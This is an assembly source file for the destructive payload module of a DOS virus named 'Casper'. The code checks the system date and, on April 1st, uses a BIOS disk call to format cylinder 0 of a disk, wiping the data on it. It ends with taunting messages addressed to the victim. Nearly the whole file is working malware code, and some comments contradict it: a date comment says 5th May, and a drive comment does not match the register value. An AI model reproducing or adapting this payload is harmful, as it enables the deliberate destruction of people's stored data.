;****************************************************************************
;*
;* 	UTILITY.ASM - Manipulation Task Code For Casper The Virus.         *
;*                                                                        *
;*     USAGE: Is automatically INCLUDED in the assembly of casper.asm     *
;*                                                                        *
;*     DETAILS: Date Activated Hard Disk Destroyer.                       *
;*              DATE: 1st April DAMAGE: Formats Cylinder 0 of HD.          *
;*                                                                        *
;**************************************************************************





		mov ah,2ah	; DOS Get Date.
		int 21h
		cmp dx,0401h	; 5th May.
		jne utilend
		mov ax,0515h	;Format Cylinder, 15 Sectors.
		mov ch,0	;Cylinder 0.
		mov dx,00	;Head 0, Drive 80h.
		mov es,dx	;Junk for address marks.
		mov bx,0	;Junk....
		int 13h		;Do It!
		int 20h		;Exit
utilend:	jmp entry3
		db	"Hi! I'm Casper The Virus, And On April The 1st I'm "
		db	"Gonna Fuck Up Your Hard Disk REAL BAD! "
		db	"In Fact It Might Just Be Impossible To Recover! "
		db	"How's That Grab Ya! <GRIN>"
entry3:
